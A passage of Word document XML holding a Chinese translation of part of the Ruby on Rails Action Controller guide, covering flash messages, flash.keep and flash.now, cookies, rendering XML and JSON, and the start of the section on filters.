              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>flash[:notice] %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B95238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&lt;p class="notice"&gt;&lt;%= flash[:notice] %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63808BD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 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5580BD5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 if</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>flash[:error] %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46ECD2C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&lt;p class="error"&gt;&lt;%= flash[:error] %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="065FE9A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 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289363B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 more content --&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3965383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&lt;/body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B2ACD4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&lt;/html&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0F60307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通过这种方法，如果一个动作设置了一条错误或提示信息，版型会自动显示它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7831076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如果你想使一个闪存值被带到另一个请求中，使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>keep</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6456"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3B64CCD6" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0BF6962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MainController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DEBEB0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让我们假设此动作对应 root_url ，但是你想要</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EA44B9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重定向所有请求到 UsersController#index 。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FF5278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如果在这里一个动作设置闪存并重定向，</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AFAB5B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当另一个重定向发生时，值正常情况下会丢失，</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F1B275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但是你可以使用 'keep' 来使其持续到另一个请求。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FC1355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index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3227DA1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将保持所有闪存值。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DE77B7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flash.keep</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7477E0B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35F4A29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你也可以使用键名指定仅保存某类值。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="050DB00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flash.keep(:notice)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7925DE9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redirect_to users_url</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CD94AF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771D557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25130B7B" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">4.2.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>flash.now</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AC2A1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默认情况下，添加值到闪存会是它们在下次请求中可用，但是有时你可能想要在同一请求中存取那些值。举例来说，如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 动作没能保存一个 resource 而你立即渲染了 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模版，这不会产生一个新的请求，但是你可能仍然想要使用闪存显示一条信息。要做到这一点，你可以按你使用普通的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>flash</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的方式使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>flash.now</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6816"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2D69FC93" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75D7042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ClientsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54C8140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create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AB6318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@client</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Client.new(params[:client])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A96FD1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if</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@client.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D77DDD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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A85E7A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else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E13EE9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flash.now[:error] = "Could not save client"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DB6092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render :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "new"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B89EA6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14F2EF2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46CC79D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560B6F57"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5 Cookies</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FBB319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你的应用可以在客户端存储少量数据 — 叫作 cookie — 会在请求间甚至 session间持久存在。Rails 提供了简单的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 存取途径通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法 — 很像 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> — 像一个哈希一样工作：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8016"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6F7B3DB4" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B69AD7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CommentsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4031937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new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48F3FEA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如果之前在 cookie 中存储过，则自动填充评论者的名字</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="537CF0C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@comment</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Comment.new(:name</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; cookies[:commenter_name])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B2E179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324D2F5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561DEAC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create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54C3D94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@comment</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Comment.new(params[:comment])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7872AF6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if</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@comment.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62C13C3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flash[:notice] = "Thanks for your comment!"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A2F223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if</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>params[:remember_name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D400F2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记住评论者的名字。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D91A14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cookies[:commenter_name] = @comment.name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66E532D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else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01DBC98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删除评论者名字 cookie，如果有的话。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67CF2A1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cookies.delete(:commenter_name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="118DA8D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029328B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redirect_to @comment.article</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="628D711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else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6739125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render :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "new"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13819C4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6E550F4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50372B0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65FB142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注意删除值时 session 你设置键为 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，删除一个 cookie 值你要使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>cookies.delete(:key)</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C402BFF"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6 渲染 xml 和 json 数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E4D90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ActionController 使得渲染 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>xml</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 数据极为简单。如果你使用鹰架生成一个控制器则你的控制器看起来会像这样。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6096"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6E27DF02" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A68055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UsersController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53A2B6C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index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="244B8D2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@users</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= User.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01739B6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respond_to do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B1D0CF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format.html # index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34873E1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format.xml  { render :xml</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @users}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4364EB6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format.json { render :json</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @users}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11A8282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7B1980E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1C72760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0AA34D7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注意到上例代码中是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>render :xml =&gt; @users</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 而不是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>render :xml =&gt; @users.to_xml</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。这是因为如果输入不是字符串的话，那么 rails 会自动调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>to_xml</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35DF538D"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7 过滤器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53951E1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过滤器是运行在控制器动作之前，之后，或前后(”around")的方法。</w:t>
      </w:r>
    </w:p>
